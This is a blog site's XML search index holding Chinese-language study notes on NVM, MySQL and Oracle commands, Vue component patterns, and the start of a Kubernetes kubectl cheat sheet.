<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>前端技能 - 相关命令</title>
    <url>/cnblogs.github.io/2025/01/05/frontEnd/%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%20-%20%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h5 id="NVM-命令行"><a href="#NVM-命令行" class="headerlink" title="NVM 命令行"></a><strong>NVM 命令行</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在项目开发过程中，使用到vue框架技术，需要安装node下载项目依赖，但经常会遇到node版本不匹配而导致无法正常下载，重新安装node却又很麻烦。为解决以上问题，nvm：一款node的版本管理工具，能够管理node的安装和使用，使用简单，可下载指定node版本和切换使用不同版本，方便了node的使用。</span><br><span class="line"></span><br><span class="line">nvm ls-remote ：列出所有远程服务器的版本（官方node version list）</span><br><span class="line">nvm list (可简化为nvm ls)：列出所有已安装的 node 版本</span><br><span class="line">nvm list available ：显示所有可下载的版本</span><br><span class="line">nvm install stable ：安装最新版 node</span><br><span class="line">nvm install [node版本号] ：安装指定版本 node</span><br><span class="line">nvm uninstall [node版本号] ：删除已安装的指定版本</span><br><span class="line">nvm use [node版本号] ：切换到指定版本 node</span><br><span class="line">nvm current ：当前 node 版本 nvm alias [别名] [node版本号] ：给不同的版本号添加别名</span><br><span class="line">nvm unalias [别名] ：删除已定义的别名 nvm alias default [node版本号] ：设置默认版本</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/coreybutler/nvm-windows/releases">NVM下载</a></p>
]]></content>
      <categories>
        <category>前端技能</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql笔记</title>
    <url>/cnblogs.github.io/2025/01/18/database/mysql/Mysql%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="MySQL数据库语句"><a href="#MySQL数据库语句" class="headerlink" title="MySQL数据库语句"></a>MySQL数据库语句</h4><h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database name; 创建数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use databasename; 选择数据库</span><br></pre></td></tr></table></figure>
<h5 id="选择数据库-1"><a href="#选择数据库-1" class="headerlink" title="选择数据库"></a>选择数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database name; 删除数据库</span><br></pre></td></tr></table></figure>

<h4 id="MySQL表语句"><a href="#MySQL表语句" class="headerlink" title="MySQL表语句"></a>MySQL表语句</h4><h5 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 新增一个User表</span><br><span class="line">CREATE TABLE user(</span><br><span class="line">id varchar(32) NOT NULL COMMENT &#x27;id&#x27;,</span><br><span class="line">name varchar(64) DEFAULT NULL COMMENT &#x27;姓名&#x27;,</span><br><span class="line">create_by varchar(32) DEFAULT NULL COMMENT &#x27;创建人&#x27;,</span><br><span class="line">create_date datetime DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">update_by varchar(32) DEFAULT NULL COMMENT &#x27;更新人&#x27;,</span><br><span class="line">update_date datetime DEFAULT NULL COMMENT &#x27;更新时间&#x27;,</span><br><span class="line">status varchar(2) DEFAULT NULL COMMENT &#x27;数据状态&#x27;,</span><br><span class="line">PRIMARY KEY (id)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&#x27;user表&#x27;;</span><br></pre></td></tr></table></figure>
<h5 id="新增表字段"><a href="#新增表字段" class="headerlink" title="新增表字段"></a>新增表字段</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table user add COLUMN age VARCHAR(20) DEFAULT NULL COMMENT &#x27;年龄&#x27;;</span><br></pre></td></tr></table></figure>
<h5 id="修改表字段"><a href="#修改表字段" class="headerlink" title="修改表字段"></a>修改表字段</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table user MODIFY COLUMN age varchar(64) COMMENT &#x27;年龄&#x27;;</span><br></pre></td></tr></table></figure>
<h5 id="删除表字段"><a href="#删除表字段" class="headerlink" title="删除表字段"></a>删除表字段</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table user DROP age;</span><br></pre></td></tr></table></figure>

<h4 id="MySQL管理语句"><a href="#MySQL管理语句" class="headerlink" title="MySQL管理语句"></a>MySQL管理语句</h4><h5 id="连接本机数据库"><a href="#连接本机数据库" class="headerlink" title="连接本机数据库"></a>连接本机数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p密码</span><br></pre></td></tr></table></figure>
<h5 id="连接到远程主机上的MYSQL"><a href="#连接到远程主机上的MYSQL" class="headerlink" title="连接到远程主机上的MYSQL"></a>连接到远程主机上的MYSQL</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -uroot -p 123456</span><br></pre></td></tr></table></figure>
<h5 id="修改mysql中root的密码"><a href="#修改mysql中root的密码" class="headerlink" title="修改mysql中root的密码"></a>修改mysql中root的密码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root password &quot;newpwd&quot;;</span><br></pre></td></tr></table></figure>
<h5 id="添加创建用户"><a href="#添加创建用户" class="headerlink" title="添加创建用户"></a>添加创建用户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user mikechen;   添加用户</span><br><span class="line">grant all on *.* to &#x27;mikechen&#x27;@&#x27;localhost&#x27; identified by &#x27;password&#x27; ;  给用户权限</span><br><span class="line">这里是把操作数据库的所有权限给了mikechen，并且设置密码是password。</span><br></pre></td></tr></table></figure>

<h4 id="MySQL增删改查语句"><a href="#MySQL增删改查语句" class="headerlink" title="MySQL增删改查语句"></a>MySQL增删改查语句</h4><h5 id="MySQL插入数据"><a href="#MySQL插入数据" class="headerlink" title="MySQL插入数据"></a>MySQL插入数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into &lt;表名&gt; ( &lt;字段名1&gt;, ...) values ( 值1, ...)</span><br></pre></td></tr></table></figure>
<h5 id="MySQL删除数据"><a href="#MySQL删除数据" class="headerlink" title="MySQL删除数据"></a>MySQL删除数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 [where  条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL修改数据"><a href="#MySQL修改数据" class="headerlink" title="MySQL修改数据"></a>MySQL修改数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update 表名 set 字段名1=值1，字段名2=值2，....[where条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL查询数据"><a href="#MySQL查询数据" class="headerlink" title="MySQL查询数据"></a>MySQL查询数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &lt;字段1，字段2，...&gt; from &lt; 表名 &gt; where &lt; 表达式 &gt;</span><br></pre></td></tr></table></figure>

<h4 id="MySQL索引语句"><a href="#MySQL索引语句" class="headerlink" title="MySQL索引语句"></a>MySQL索引语句</h4><h5 id="使用CREATE-INDEX"><a href="#使用CREATE-INDEX" class="headerlink" title="使用CREATE INDEX"></a>使用CREATE INDEX</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">能够增加普通索引和UNIQUE索引两种，其格式如下：</span><br><span class="line">create index index_name on table_name (column_list) ;</span><br><span class="line">create unique index index_name on table_name (column_list) ;</span><br></pre></td></tr></table></figure>
<h5 id="使用ALTER-TABLE"><a href="#使用ALTER-TABLE" class="headerlink" title="使用ALTER TABLE"></a>使用ALTER TABLE</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.PRIMARY KEY（主键索引）</span><br><span class="line">        mysql&gt;ALTER TABLE `table_name` ADD PRIMARY KEY index_name(`column1`, `column2`) </span><br><span class="line">2.UNIQUE(唯一索引)</span><br><span class="line">        mysql&gt;ALTER TABLE `table_name` ADD UNIQUE index_name(`column1`, `column2`) </span><br><span class="line">3.INDEX(普通索引)</span><br><span class="line">        mysql&gt;ALTER TABLE `table_name` ADD INDEX index_name (`column1`, `column2`)</span><br><span class="line">4.FULLTEXT(全文索引)</span><br><span class="line">        mysql&gt;ALTER TABLE `table_name` ADD FULLTEXT (`column1`, `column2`)</span><br></pre></td></tr></table></figure>
<h5 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上FROM db_name</span><br><span class="line">SHOW INDEX FROM table_name [FROM db_name]</span><br><span class="line">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span><br><span class="line">SHOW INDEX FROM [db_name.]table_name</span><br></pre></td></tr></table></figure>
<h5 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-先删除</span><br><span class="line">ALTER TABLE user</span><br><span class="line">DROP INDEX idx_user_username;</span><br><span class="line">--再以修改后的内容创建同名索引</span><br><span class="line">CREATE INDEX idx_cust_name ON customers (cust_name(8));</span><br></pre></td></tr></table></figure>
<h5 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE customers</span><br><span class="line">DROP INDEX idx_cust_name;</span><br></pre></td></tr></table></figure>

<h4 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h4><h5 id="直接查询"><a href="#直接查询" class="headerlink" title="直接查询"></a>直接查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段 from 表名</span><br></pre></td></tr></table></figure>
<h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段 from 表名 where 条件</span><br></pre></td></tr></table></figure>
<h5 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段 from 表名 order by 字段 排序方式(desc:asc)</span><br></pre></td></tr></table></figure>
<h5 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from userwhere age &gt;=21 and age&lt;=23;</span><br></pre></td></tr></table></figure>
<h5 id="SQL查询五子句"><a href="#SQL查询五子句" class="headerlink" title="SQL查询五子句"></a>SQL查询五子句</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select */字段列表 from 数据表名称 where 子句 group by 子句 having 子句 order by 子句 limit 子句;</span><br><span class="line"></span><br><span class="line">①.where 子句</span><br><span class="line">②.group by 子句</span><br><span class="line">③.having 子句</span><br><span class="line">④.order by 子句</span><br><span class="line">⑤.limit子句</span><br></pre></td></tr></table></figure>
<h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT uid, name FROM staffs WHERE name LIKE &#x27;a%&#x27;;</span><br></pre></td></tr></table></figure>
<h5 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT uid, name FROM staffs WHERE uid IN(1, 3, 5);</span><br></pre></td></tr></table></figure>
<h5 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM staffs LIMIT 5, 10;</span><br></pre></td></tr></table></figure>
<h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p><img src="https://s2.loli.net/2025/01/18/Gm3nWlJZ7H5RNt6.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_list</span><br><span class="line">FROM t1</span><br><span class="line">INNER JOIN t2 ON join_condition;</span><br></pre></td></tr></table></figure>
<p>也叫内连接或等值连接，用于获取两个表中字段匹配关系的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/9sA2NhSRmMzJiwU.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    t1.c1, t1.c2, t2.c1, t2.c2</span><br><span class="line">FROM</span><br><span class="line">    t1</span><br><span class="line">        LEFT JOIN</span><br><span class="line">    t2 ON t1.c1 = t2.c1;</span><br></pre></td></tr></table></figure>
<p>左连接：获取左表所有记录，即使右表没有对应匹配的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/MtLPk146X3l5CHq.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *</span><br><span class="line">from students as s</span><br><span class="line">right join teacher as t</span><br><span class="line">on s.class_id = t.class_id</span><br></pre></td></tr></table></figure>
<p>与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle笔记</title>
    <url>/cnblogs.github.io/2025/05/31/database/oracle/Oracle%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Oracle数据库连接"><a href="#Oracle数据库连接" class="headerlink" title="Oracle数据库连接"></a>Oracle数据库连接</h3><p>三种以系统管理员身份连接数据库的方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conn / as sysdba  -- 无需监听进程</span><br><span class="line">conn system/admin  -- 本地连接</span><br><span class="line">conn system/admin@oracle  -- 需要监听进程</span><br></pre></td></tr></table></figure>
<p>查看当前数据库有多少用户连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username, sid, serial# from v$session;</span><br></pre></td></tr></table></figure>
<p>监听服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsnrctl start  -- 启动监听  </span><br><span class="line">lsnrctl stop   -- 关闭监听  </span><br><span class="line">lsnrctl status -- 查看监听状态</span><br></pre></td></tr></table></figure>
<p>Oracle实例服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup;  -- 启动实例</span><br><span class="line">shutdown immediate;  -- 关闭实例</span><br><span class="line">select * from v$instance;  -- 查看实例状态</span><br></pre></td></tr></table></figure>

<h3 id="Oracle用户管理"><a href="#Oracle用户管理" class="headerlink" title="Oracle用户管理"></a>Oracle用户管理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看系统已有用户</span><br><span class="line">select * from all_users;</span><br><span class="line"></span><br><span class="line"># 显示当前连接用户</span><br><span class="line">show user;</span><br><span class="line"></span><br><span class="line"># 创建新用户并授权</span><br><span class="line">create user a identified by a;</span><br><span class="line">grant connect, resource to a;</span><br><span class="line"></span><br><span class="line"># 修改用户密码</span><br><span class="line">alter user a identified by 123456;</span><br><span class="line"></span><br><span class="line"># 授权用户可以访问数据库所有表</span><br><span class="line">grant select any table to a;</span><br><span class="line"></span><br><span class="line"># 授权用户操作其他用户的表</span><br><span class="line">grant select, insert, update, delete on student.emp to a;</span><br><span class="line"></span><br><span class="line"># 查找用户下的所有表</span><br><span class="line">select * from tab;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的默认表空间</span><br><span class="line">select username, default_tablespace from user_users;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的角色</span><br><span class="line">select * from user_role_privs;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的权限</span><br><span class="line">select * from user_sys_privs;</span><br><span class="line">select * from user_tab_privs;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle表操作"><a href="#Oracle表操作" class="headerlink" title="Oracle表操作"></a>Oracle表操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看用户下所有的表</span><br><span class="line">select * from user_tables;</span><br><span class="line"></span><br><span class="line"># 查找表名包含&quot;LOG&quot;的表</span><br><span class="line">select object_name, object_id from user_objects where instr(object_name, &#x27;LOG&#x27;) &gt; 0;</span><br><span class="line"></span><br><span class="line"># 查看表的创建时间</span><br><span class="line">select object_name, created from user_objects where object_name = upper(&#x27;&amp;table_name&#x27;);</span><br><span class="line"></span><br><span class="line"># 查看表的大小</span><br><span class="line">select sum(bytes) / (1024*1024) as &quot;size(M)&quot; from user_segments where segment_name = upper(&#x27;&amp;table_name&#x27;);</span><br><span class="line"></span><br><span class="line"># 查看存放在Oracle内存区的表</span><br><span class="line">select table_name, cache from user_tables where instr(cache, &#x27;Y&#x27;) &gt; 0;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle索引"><a href="#Oracle索引" class="headerlink" title="Oracle索引"></a>Oracle索引</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看索引个数和类别</span><br><span class="line">select index_name, index_type, table_name from user_indexes order by table_name;</span><br><span class="line"></span><br><span class="line"># 查看索引所涉及的字段</span><br><span class="line">select * from user_ind_columns where index_name = upper(&#x27;&amp;index_name&#x27;);</span><br><span class="line"></span><br><span class="line"># 查看索引大小</span><br><span class="line">select sum(bytes) / (1024*1024) as &quot;size(M)&quot; from user_segments where segment_name = upper(&#x27;&amp;index_name&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="Oracle数据库管理"><a href="#Oracle数据库管理" class="headerlink" title="Oracle数据库管理"></a>Oracle数据库管理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看表空间的名称及大小</span><br><span class="line">select t.tablespace_name, round(sum(bytes/(1024*1024)),0) ts_size from dba_tablespaces t, dba_data_files d where t.tablespace_name = d.tablespace_name group by t.tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看表空间物理文件的名称及大小</span><br><span class="line">select tablespace_name, file_id, file_name, round(bytes/(1024*1024),0) total_space from dba_data_files order by tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看回滚段名称及大小</span><br><span class="line">select segment_name, tablespace_name, r.status, (initial_extent/1024) InitialExtent, (next_extent/1024) NextExtent, max_extents, v.curext CurExtent from dba_rollback_segs r, v$rollstat v where r.segment_id = v.usn(+) order by segment_name;</span><br><span class="line"></span><br><span class="line"># 查看控制文件</span><br><span class="line">select name from v$controlfile;</span><br><span class="line"></span><br><span class="line"># 查看日志文件</span><br><span class="line">select member from v$logfile;</span><br><span class="line"></span><br><span class="line"># 查看表空间的使用情况</span><br><span class="line">select sum(bytes)/(1024*1024) as free_space, tablespace_name from dba_free_space group by tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看数据库对象</span><br><span class="line">select owner, object_type, status, count(*) count# from all_objects group by owner, object_type, status;</span><br><span class="line"></span><br><span class="line"># 查看数据库版本</span><br><span class="line">select version FROM Product_component_version where SUBSTR(PRODUCT,1,6)=&#x27;Oracle&#x27;;</span><br><span class="line"></span><br><span class="line"># 查看数据库的创建日期和归档方式</span><br><span class="line">select Created, Log_Mode From V$Database;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue笔记</title>
    <url>/cnblogs.github.io/2025/01/17/frontEnd/vue/Vue%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="组件的基石：Props"><a href="#组件的基石：Props" class="headerlink" title="组件的基石：Props"></a><strong>组件的基石：Props</strong></h5><p>Props（属性）是父组件向子组件传递数据的桥梁。通过 props，我们可以将父组件的状态传递给子组件，从而实现数据的单向流动。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 Parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Child :message=&quot;parentMessage&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123; Child &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      parentMessage: &#x27;Hello from Parent!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 Child.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#x27;message&#x27;]</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>在父组件中，通过 :message&#x3D;”parentMessage” 将 parentMessage 的值传递给子组件的 message prop。</li>
<li>在子组件中，通过 props: [‘message’] 声明接收一个名为 message 的 prop。</li>
</ul>
<h5 id="组件的“发声器”：Emit"><a href="#组件的“发声器”：Emit" class="headerlink" title="组件的“发声器”：Emit"></a><strong>组件的“发声器”：Emit</strong></h5><p>Emit（发射）是子组件向父组件传递事件和数据的桥梁。当子组件内部发生了一些变化，需要通知父组件时，就可以使用 emit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 Button.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;handleClick&quot;&gt;Click Me&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleClick() &#123;</span><br><span class="line">      this.$emit(&#x27;button-click&#x27;, &#x27;button clicked!&#x27;); // 发射一个 &#x27;button-click&#x27; 事件</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 Parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Button @button-click=&quot;handleButtonClick&quot; /&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Button from &#x27;./Button.vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123; Button &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleButtonClick(msg) &#123;</span><br><span class="line">      this.message = msg; // 接收子组件传来的数据</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>在子组件中，通过 this.$emit(‘button-click’, ‘button clicked!’) 发射一个名为 button-click 的事件，并传递数据 “button clicked!”。</li>
<li>在父组件中，通过 @button-click&#x3D;”handleButtonClick” 监听 button-click 事件，并执行 handleButtonClick 方法。</li>
</ul>
<h5 id="组件的“插槽”：Slots"><a href="#组件的“插槽”：Slots" class="headerlink" title="组件的“插槽”：Slots"></a><strong>组件的“插槽”：Slots</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 Card.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;card&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">      &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">      &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">       &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 Parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Card&gt;</span><br><span class="line">    &lt;template #header&gt;</span><br><span class="line">        &lt;h2&gt;Card Header&lt;/h2&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">    &lt;p&gt;This is card content.&lt;/p&gt;</span><br><span class="line">    &lt;template #footer&gt;</span><br><span class="line">        &lt;span&gt;Card Footer&lt;/span&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">  &lt;/Card&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Card from &#x27;./Card.vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123; Card &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>作用域插槽：作用域插槽可以让父组件访问子组件的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 List.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;item in list&quot; :key=&quot;item&quot;&gt;</span><br><span class="line">      &lt;slot :item=&quot;item&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/slot&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      list: [&#x27;Item 1&#x27;, &#x27;Item 2&#x27;, &#x27;Item 3&#x27;]</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 Parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;List&gt;</span><br><span class="line">    &lt;template v-slot=&quot;&#123; item &#125;&quot;&gt;</span><br><span class="line">      &lt;span style=&quot;color: red&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">  &lt;/List&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import List from &#x27;./List.vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123; List &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端技能</category>
      </categories>
      <tags>
        <tag>VUE</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes笔记</title>
    <url>/cnblogs.github.io/2025/05/30/operations/Kubernetes/Kubernetes%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Kubernetes常用命令"><a href="#Kubernetes常用命令" class="headerlink" title="Kubernetes常用命令"></a>Kubernetes常用命令</h3><h4 id="集群信息"><a href="#集群信息" class="headerlink" title="集群信息"></a>集群信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl cluster-info                  # 显示集群信息</span><br><span class="line">kubectl version                       # 显示客户端和服务器版本</span><br><span class="line">kubectl get nodes                     # 查看所有节点状态</span><br><span class="line">kubectl describe node &lt;node-name&gt;     # 查看节点详细信息</span><br></pre></td></tr></table></figure>
<h4 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get &lt;resource&gt;                # 查看资源(pods, services, deployments等)</span><br><span class="line">kubectl describe &lt;resource&gt; &lt;name&gt;    # 查看资源详细信息</span><br><span class="line">kubectl create -f &lt;file.yaml&gt;         # 通过YAML文件创建资源</span><br><span class="line">kubectl apply -f &lt;file.yaml&gt;          # 应用YAML文件配置</span><br><span class="line">kubectl delete -f &lt;file.yaml&gt;         # 删除YAML文件中定义的资源</span><br><span class="line">kubectl delete &lt;resource&gt; &lt;name&gt;      # 删除指定资源</span><br></pre></td></tr></table></figure>
